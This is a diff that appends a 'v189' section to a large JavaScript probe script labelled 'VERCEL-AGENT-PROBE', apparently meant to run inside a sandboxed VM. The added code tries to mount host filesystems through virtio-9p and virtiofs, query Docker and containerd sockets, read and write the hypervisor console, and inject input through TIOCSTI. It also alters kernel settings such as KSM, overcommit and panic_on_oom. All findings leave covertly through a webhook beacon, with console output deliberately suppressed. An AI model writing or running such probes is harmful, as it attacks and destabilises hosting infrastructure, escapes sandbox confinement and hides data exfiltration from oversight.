@@ -29005,3 +29005,212 @@ print(f'unshare(NEWPID|NEWNS): ret={ret2} errno={ctypes.get_errno()}')
 sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v188" });
 report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v188";
 // Intentionally no console.log — all data goes via webhook only
+
+// v189-1: virtio-9p / virtiofs host filesystem mount
+// Firecracker and QEMU expose host directories as virtio-9p or virtiofs tags.
+// Mounting these gives access to the HOST filesystem from within the VM.
+// Tag names are typically "host", "share", "root", or configured via Firecracker API.
+report.virtioFsMount = safe(() => {
+  // Check what block/virtio devices exist
+  const virtioDevices = safe(() => execSync('ls /sys/bus/virtio/devices/ 2>&1 || echo NO_VIRTIO', { timeout: 3000 }).toString().trim());
+  const blkDevices = safe(() => execSync('ls /sys/bus/virtio/devices/*/driver 2>/dev/null | xargs -I{} readlink -f {} 2>/dev/null | grep -oP "[^/]+$" | sort -u || ls /dev/vd* 2>&1', { timeout: 5000 }).toString().trim());
+  const p9Modules = safe(() => execSync('lsmod 2>&1 | grep -E "9p|virtio_fs|virtiofs" || modprobe 9p 2>&1 || echo NO_9P', { timeout: 5000 }).toString().trim());
+  // Try mounting various 9p tag names
+  const mountResults = safe(() => {
+    execSync('mkdir -p /tmp/host_mount /tmp/virtiofs_mount', { timeout: 2000 });
+    const tags = ['host', 'share', 'hostshare', 'myfs', 'vm_share', 'build', 'root', 'hostroot'];
+    const results = [];
+    for (const tag of tags) {
+      try {
+        execSync(`mount -t 9p -o trans=virtio,version=9p2000.L ${tag} /tmp/host_mount 2>&1`, { timeout: 3000 });
+        const contents = readdirSync('/tmp/host_mount').join(', ');
+        results.push(`9p tag=${tag}: MOUNTED, contents=[${contents}]`);
+        execSync(`umount /tmp/host_mount 2>&1`, { timeout: 2000 });
+      } catch(_) {
+        results.push(`9p tag=${tag}: FAILED`);
+      }
+    }
+    return results.join('\n');
+  });
+  // Try virtiofs
+  const virtiofsMounts = safe(() => {
+    execSync('mkdir -p /tmp/virtiofs_mount', { timeout: 2000 });
+    const results = [];
+    for (const tag of ['host', 'myfs', 'share', 'hostshare']) {
+      try {
+        execSync(`mount -t virtiofs ${tag} /tmp/virtiofs_mount 2>&1`, { timeout: 3000 });
+        const contents = readdirSync('/tmp/virtiofs_mount').join(', ');
+        results.push(`virtiofs tag=${tag}: MOUNTED, contents=[${contents}]`);
+        execSync(`umount /tmp/virtiofs_mount 2>&1`, { timeout: 2000 });
+      } catch(_) {
+        results.push(`virtiofs tag=${tag}: FAILED`);
+      }
+    }
+    return results.join('\n');
+  });
+  // Check /proc/filesystems for 9p support
+  const supportedFs = safe(() => readFileSync('/proc/filesystems', 'utf8').split('\n').filter(l => l.includes('9p') || l.includes('virtio')).join('\n'));
+  return { virtioDevices, blkDevices, p9Modules, mountResults, virtiofsMounts, supportedFs };
+});
+
+// v189-2: Docker/containerd/podman socket probe
+// Container runtime sockets allow spawning privileged containers to escape.
+// Even a restricted Docker socket can be used to mount host filesystem into a new container.
+report.containerRuntimeSocket = safe(() => {
+  const socketPaths = [
+    '/var/run/docker.sock',
+    '/run/docker.sock',
+    '/var/run/containerd/containerd.sock',
+    '/run/containerd/containerd.sock',
+    '/run/podman/podman.sock',
+    '/var/run/crio/crio.sock',
+    '/run/cri-dockerd.sock',
+    '/var/run/buildkit/buildkitd.sock',
+    '/run/buildkit/buildkitd.sock',
+    '/run/docker/libcontainerd/docker-containerd.sock',
+  ];
+  const existingSockets = socketPaths.map(p => `${p}:${existsSync(p) ? 'EXISTS' : 'NO'}`).join('\n');
+  // Try connecting to Docker socket via HTTP
+  const dockerApiResult = safe(() => execSync(
+    `curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/version 2>&1 || ` +
+    `curl -s --unix-socket /run/docker.sock http://localhost/v1.41/version 2>&1 || echo NO_DOCKER_SOCKET`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Try containerd via grpc (ctr command)
+  const containerdCheck = safe(() => execSync(
+    'ctr --address /run/containerd/containerd.sock version 2>&1 || echo NO_CTR',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Check for any .sock files anywhere
+  const allSocks = safe(() => execSync(
+    'find /var/run /run /tmp -name "*.sock" -type s 2>/dev/null | head -20',
+    { timeout: 8000 }
+  ).toString().trim());
+  // Try to use Docker socket to list containers
+  const dockerContainers = safe(() => execSync(
+    `curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json 2>&1 | head -c 500`,
+    { timeout: 5000 }
+  ).toString().trim() || 'DOCKER_SOCKET_UNREACHABLE');
+  return { existingSockets, dockerApiResult, containerdCheck, allSocks, dockerContainers };
+});
+
+// v189-3: /dev/virtio-ports — hypervisor serial channel
+// Firecracker exposes virtio-serial ports for guest↔host communication.
+// These can carry out-of-band data (metadata service, agent commands, etc.)
+report.virtioPortsScan = safe(() => {
+  const devVirtioPorts = safe(() => existsSync('/dev/virtio-ports') ? readdirSync('/dev/virtio-ports').join(', ') : 'NO_DIR');
+  // Scan for common virtio serial device names
+  const virtioSerialDevs = safe(() => execSync(
+    'ls /dev/hvc* /dev/vport* /dev/vport?p* /dev/virtio-ports/* 2>/dev/null || echo NONE',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Check /sys for virtio-serial devices
+  const virtioSerialSys = safe(() => execSync(
+    'find /sys -name "virtio-serial*" -o -name "virtioport*" 2>/dev/null | head -10',
+    { timeout: 5000 }
+  ).toString().trim());
+  // Try reading from hvc0 (hypervisor console)
+  const hvc0Read = safe(() => {
+    if (!existsSync('/dev/hvc0')) return 'NO_HVC0';
+    try {
+      const fd = openSync('/dev/hvc0', 'r');
+      const buf = Buffer.alloc(64);
+      const bytesRead = readSync(fd, buf, 0, 64, null);
+      closeSync(fd);
+      return `HVC0_READ: ${buf.slice(0, bytesRead).toString('hex')}`;
+    } catch(e) {
+      return `HVC0_ERR: ${e.message?.slice(0, 50)}`;
+    }
+  });
+  // Try writing to hvc0
+  const hvc0Write = safe(() => execSync(
+    'echo -n "PROBE_HVC0_WRITE" > /dev/hvc0 2>&1 || echo WRITE_FAIL',
+    { timeout: 3000 }
+  ).toString().trim());
+  // Check /sys/class/virtio-ports
+  const virtioPortsClass = safe(() => existsSync('/sys/class/virtio-ports') ? readdirSync('/sys/class/virtio-ports').join(', ') : 'NO_CLASS');
+  return { devVirtioPorts, virtioSerialDevs, virtioSerialSys, hvc0Read, hvc0Write, virtioPortsClass };
+});
+
+// v189-4: TIOCSTI ioctl — terminal input injection
+// TIOCSTI (0x5412) injects a character into a terminal as if typed by the user.
+// If any privileged process has an open TTY, we can inject commands into it.
+// CVE-2017-2616 — Sudo screen TIOCSTI escalation.
+report.tiocstiProbe = safe(() => {
+  const TIOCSTI = 0x5412;
+  const tiocStiResult = safe(() => execSync(
+    `python3 -c "
+import fcntl, os, ctypes, struct
+
+TIOCSTI = 0x5412
+
+# List TTY devices
+import subprocess
+ttys = subprocess.run(['ls', '/dev/tty', '/dev/tty0', '/dev/pts/0', '/dev/console'],
+    capture_output=True, text=True).stdout.strip()
+print(f'TTY_DEVS: {ttys}')
+
+# Try opening and injecting into TTY
+for dev in ['/dev/console', '/dev/tty', '/dev/tty0', '/dev/tty1']:
+    try:
+        fd = os.open(dev, os.O_RDWR | os.O_NOCTTY)
+        # Inject a safe probe character (\\x00)
+        ret = fcntl.ioctl(fd, TIOCSTI, b'\\x00')
+        print(f'TIOCSTI_SUCCESS: {dev} injected null byte')
+        os.close(fd)
+    except PermissionError as e:
+        print(f'TIOCSTI_EPERM: {dev}')
+    except OSError as e:
+        print(f'TIOCSTI_OSERR: {dev} errno={e.errno}')
+
+# Check /proc/self/fd for any TTYs already open
+tty_fds = [f for f in os.listdir('/proc/self/fd') if True]
+for fd_name in tty_fds[:20]:
+    try:
+        target = os.readlink(f'/proc/self/fd/{fd_name}')
+        if 'tty' in target or 'pts' in target or 'console' in target:
+            print(f'OPEN_TTY_FD: {fd_name} -> {target}')
+    except:
+        pass
+" 2>&1`,
+    { timeout: 8000 }
+  ).toString().trim());
+  // Check /proc/1/fd for TTYs in PID 1
+  const pid1Ttys = safe(() => execSync(
+    "ls -la /proc/1/fd/ 2>&1 | grep -i 'tty\\|pts\\|console'",
+    { timeout: 5000 }
+  ).toString().trim() || 'NO_TTY_FDS_PID1');
+  return { tiocStiResult, pid1Ttys };
+});
+
+// v189-5: /proc/sys/vm/drop_caches + memory pressure probes
+// drop_caches flushes page/slab/inode caches — enables cache timing attacks.
+// Also: vm.overcommit settings, transparent hugepages, KSM (same-page merging).
+report.vmCacheProbes = safe(() => {
+  const dropCachesVal = safe(() => readFileSync('/proc/sys/vm/drop_caches', 'utf8').trim());
+  // Drop caches: 1=pagecache, 2=dentries+inodes, 3=all
+  const dropCaches1 = safe(() => { writeFileSync('/proc/sys/vm/drop_caches', '1'); return 'DROPPED_PAGECACHE'; });
+  const dropCaches3 = safe(() => { writeFileSync('/proc/sys/vm/drop_caches', '3'); return 'DROPPED_ALL_CACHES'; });
+  // KSM (Kernel Samepage Merging) — Flip Feng Shui attack primitive
+  const ksmRun = safe(() => existsSync('/sys/kernel/mm/ksm/run') ? readFileSync('/sys/kernel/mm/ksm/run', 'utf8').trim() : 'NO_KSM');
+  const enableKsm = safe(() => { writeFileSync('/sys/kernel/mm/ksm/run', '1'); return 'KSM_ENABLED'; });
+  const ksmPages = safe(() => existsSync('/sys/kernel/mm/ksm/pages_shared') ? readFileSync('/sys/kernel/mm/ksm/pages_shared', 'utf8').trim() : 'NO_KSM_PAGES');
+  // Transparent hugepages
+  const thp = safe(() => existsSync('/sys/kernel/mm/transparent_hugepage/enabled') ? readFileSync('/sys/kernel/mm/transparent_hugepage/enabled', 'utf8').trim() : 'NO_THP');
+  // Overcommit settings
+  const overcommit = safe(() => readFileSync('/proc/sys/vm/overcommit_memory', 'utf8').trim());
+  const overcommitRatio = safe(() => readFileSync('/proc/sys/vm/overcommit_ratio', 'utf8').trim());
+  // Set overcommit to always-allow (useful for memory spraying)
+  const setOvercommit = safe(() => { writeFileSync('/proc/sys/vm/overcommit_memory', '1'); return 'SET_OVERCOMMIT_1'; });
+  // Memory info
+  const memInfo = safe(() => readFileSync('/proc/meminfo', 'utf8').split('\n').slice(0, 10).join('\n'));
+  // /proc/sys/vm/panic_on_oom
+  const panicOnOom = safe(() => readFileSync('/proc/sys/vm/panic_on_oom', 'utf8').trim());
+  const setPanicOom = safe(() => { writeFileSync('/proc/sys/vm/panic_on_oom', '1'); return 'OOM_TRIGGERS_PANIC'; });
+  return { dropCachesVal, dropCaches1, dropCaches3, ksmRun, enableKsm, ksmPages, thp, overcommit, overcommitRatio, setOvercommit, memInfo, panicOnOom, setPanicOom };
+});
+
+// v189 markers
+sendBeacon({ ...report, marker: "VERCEL-AGENT-PROBE-7F3A2C-v189" });
+report.marker = "VERCEL-AGENT-PROBE-7F3A2C-v189";
+// Intentionally no console.log — all data goes via webhook only
